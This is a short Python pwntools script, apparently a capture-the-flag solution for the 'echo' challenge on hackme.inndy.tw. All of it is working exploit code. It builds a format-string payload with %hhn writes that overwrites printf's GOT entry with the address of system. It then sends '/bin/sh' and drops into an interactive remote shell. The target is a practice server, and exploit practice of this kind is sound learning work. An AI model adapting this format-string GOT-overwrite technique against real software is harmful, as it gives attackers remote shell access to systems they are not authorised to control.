#!/usr/bin/env python2
from pwn import *
import pwnlib.elf
import pwnlib.shellcraft

# init
e = ELF('/tmp/echo')
c = remote('hackme.inndy.tw', 7711)

context.os='linux'
context.arch='i386'

# get system got
system = e.symbols['system']

# set printf = system
ans = p32(e.got['printf']) + 'AAAA'
ans += p32(e.got['printf'] + 1) + 'AAAA'
ans += p32(e.got['printf'] + 2) + 'AAAA'
ans += p32(e.got['printf'] + 3) + 'AAAA'
ans += '%8x' * 5

count = (8 * 4 + 8 * 5) % 256

for i in range(4):
    byte = (system & (0xff << (i * 8))) >> (i * 8)
    char_num = (byte - count) % 256
    ans += '%{}c'.format(int(char_num)) + '%hhn'
    count = (count + char_num) % 256

c.sendline(ans)
c.sendline('/bin/sh')
c.interactive()
c.close()
